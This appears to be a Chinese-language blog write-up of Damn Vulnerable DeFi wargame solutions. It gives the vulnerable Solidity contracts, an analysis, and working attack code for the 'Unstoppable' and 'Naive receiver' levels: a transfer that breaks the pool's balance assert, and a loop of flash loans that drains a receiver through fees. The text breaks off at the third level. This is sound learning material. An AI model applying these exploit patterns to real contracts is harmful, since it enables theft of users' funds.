{"title":"Damn Vulnerable Defi","uid":"3e4e5e9b128bda97a530bf234e940a7f","slug":"Damn Vulnerable DeFi","date":"2022-08-02T02:49:20.316Z","updated":"2022-08-02T02:49:20.316Z","comments":true,"path":"api/articles/Damn Vulnerable DeFi.json","keywords":null,"cover":[],"content":"<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images1/img/202208011817429.png\"></p>\n<span id=\"more\"></span>\n\n<p>地址：<a href=\"https://www.damnvulnerabledefi.xyz/\">https://www.damnvulnerabledefi.xyz/</a></p>\n<h1 id=\"1-Unstoppable\"><a href=\"#1-Unstoppable\" class=\"headerlink\" title=\"1.Unstoppable\"></a>1.Unstoppable</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：</p>\n<p>There’s a lending pool with a million DVT tokens in balance, offering flash loans for free.</p>\n<p>If only there was a way to attack and stop the pool from offering flash loans …</p>\n<p>You start with 100 DVT tokens in balance.</p></blockquote>\n<h2 id=\"code\"><a href=\"#code\" class=\"headerlink\" title=\"code\"></a>code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/IERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/security/ReentrancyGuard.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">IReceiver</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">receiveTokens</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">/**\n * @title UnstoppableLender\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">UnstoppableLender</span> <span class=\"token keyword\">is</span> ReentrancyGuard <span class=\"token punctuation\">&#123;</span>\n\n    IERC20 <span class=\"token keyword\">public</span> immutable damnValuableToken<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> poolBalance<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>tokenAddress <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Token address cannot be zero\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        damnValuableToken <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>tokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">depositTokens</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>amount <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Must deposit at least one token\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// Transfer token from sender. Sender must have first approved them.</span>\n        damnValuableToken<span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        poolBalance <span class=\"token operator\">=</span> poolBalance <span class=\"token operator\">+</span> amount<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> borrowAmount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>borrowAmount <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Must borrow at least one token\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint256</span> balanceBefore <span class=\"token operator\">=</span> damnValuableToken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balanceBefore <span class=\"token operator\">>=</span> borrowAmount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not enough tokens in pool\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Ensured by the protocol via the `depositTokens` function</span>\n        <span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span>poolBalance <span class=\"token operator\">==</span> balanceBefore<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        damnValuableToken<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> borrowAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token function\">IReceiver</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">receiveTokens</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>damnValuableToken<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> borrowAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token builtin\">uint256</span> balanceAfter <span class=\"token operator\">=</span> damnValuableToken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balanceAfter <span class=\"token operator\">>=</span> balanceBefore<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Flash loan hasn't been paid back\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"analyze\"><a href=\"#analyze\" class=\"headerlink\" title=\"analyze\"></a>analyze</h2><p>题目要求攻击合约，使池子不再提供贷款功能，分析合约 ，poolBalance只能在epositTokens()函数被触发时增加，而flashLoan()函数下assert(poolBalance &#x3D;&#x3D; balanceBefore)，意味着如果向合约转账一定的token，balanceBefore会增加但是poolBalance不会增加，从而使assert得不到满足，攻击即可达到要求。</p>\n<h2 id=\"attack\"><a href=\"#attack\" class=\"headerlink\" title=\"attack\"></a>attack</h2><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span><span class=\"token constant\">INITIAL_ATTACKER_TOKEN_BALANCE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h1 id=\"2-Naive-receiver\"><a href=\"#2-Naive-receiver\" class=\"headerlink\" title=\"2.Naive receiver\"></a>2.Naive receiver</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：There’s a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.</p>\n<p>You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.</p>\n<p>Drain all ETH funds from the user’s contract. Doing it in a single transaction is a big plus ;)</p></blockquote>\n<h2 id=\"FlashLoanReceiver-code\"><a href=\"#FlashLoanReceiver-code\" class=\"headerlink\" title=\"FlashLoanReceiver  code\"></a><strong>FlashLoanReceiver</strong>  code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/Address.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * @title FlashLoanReceiver\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">FlashLoanReceiver</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">Address</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">private</span> pool<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> poolAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        pool <span class=\"token operator\">=</span> poolAddress<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Function called by the pool during flash loan</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">receiveEther</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> fee<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> pool<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Sender must be pool\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint256</span> amountToBeRepaid <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">+</span> fee<span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">>=</span> amountToBeRepaid<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Cannot borrow that much\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token function\">_executeActionDuringFlashLoan</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token comment\">// Return funds to pool</span>\n        pool<span class=\"token punctuation\">.</span><span class=\"token function\">sendValue</span><span class=\"token punctuation\">(</span>amountToBeRepaid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Internal function where the funds received are used</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_executeActionDuringFlashLoan</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Allow deposits of ETH</span>\n    receive <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"NaiveReceiverLenderPool-code\"><a href=\"#NaiveReceiverLenderPool-code\" class=\"headerlink\" title=\"NaiveReceiverLenderPool  code\"></a><strong>NaiveReceiverLenderPool</strong>  code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/security/ReentrancyGuard.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/Address.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * @title NaiveReceiverLenderPool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">NaiveReceiverLenderPool</span> <span class=\"token keyword\">is</span> ReentrancyGuard <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">Address</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">constant</span> FIXED_FEE <span class=\"token operator\">=</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">;</span> <span class=\"token comment\">// not the cheapest flash loan</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">fixedFee</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> FIXED_FEE<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> borrower<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> borrowAmount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token builtin\">uint256</span> balanceBefore <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balanceBefore <span class=\"token operator\">>=</span> borrowAmount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not enough ETH in pool\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>borrower<span class=\"token punctuation\">.</span><span class=\"token function\">isContract</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Borrower must be a deployed contract\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// Transfer ETH and handle control to receiver</span>\n        borrower<span class=\"token punctuation\">.</span><span class=\"token function\">functionCallWithValue</span><span class=\"token punctuation\">(</span>\n            abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span>\n                <span class=\"token string\">\"receiveEther(uint256)\"</span><span class=\"token punctuation\">,</span>\n                FIXED_FEE\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            borrowAmount\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">>=</span> balanceBefore <span class=\"token operator\">+</span> FIXED_FEE<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Flash loan hasn't been paid back\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Allow deposits of ETH</span>\n    receive <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"analyze-1\"><a href=\"#analyze-1\" class=\"headerlink\" title=\"analyze\"></a>analyze</h2><p>题目要求再一笔交易中将user的10eth全部耗尽，user合约中唯一有转出eth的地方就是receiveEther()函数。</p>\n<p>审计之后我们不难发现一次转出fee*1wei的余额，即每次转出1eth。</p>\n<p>虽然receiveEther()函数中require(address(this).balance &gt;&#x3D; amountToBeRepaid)但是随着函数调用，将会有msg.value的余额转入，所以只需要合约之前的余额大于fee即可，而合约中本来有10eth，所以再balance(this)清零前require总能被满足。</p>\n<p>综上所述，在攻击合约中，for循环调用10次flashLoan()函数即可。</p>\n<h2 id=\"attack-1\"><a href=\"#attack-1\" class=\"headerlink\" title=\"attack\"></a>attack</h2><p>attackcontract</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">import</span> <span class=\"token string\">\"E:\\school\\BLOCKCHAIN\\Damn Vulnerable DeFi\\damn-vulnerable-defi-2.0.0\\damn-vulnerable-defi-2.0.0\\contracts\\naive-receiver\\NaiveReceiverLenderPool.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">AttackNaiveReceiver</span> <span class=\"token punctuation\">&#123;</span>\n    NaiveReceiverLenderPool target<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> pool<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        target <span class=\"token operator\">=</span> <span class=\"token function\">NaiveReceiverLenderPool</span><span class=\"token punctuation\">(</span>pool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tar<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            target<span class=\"token punctuation\">.</span><span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span>tar<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> AttackFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"AttackNaiveReceiver\"</span><span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">const</span> attackContract <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> AttackFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">await</span> attackContract<span class=\"token punctuation\">.</span><span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>receiver<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"3-Truster\"><a href=\"#3-Truster\" class=\"headerlink\" title=\"3.Truster\"></a>3.Truster</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" 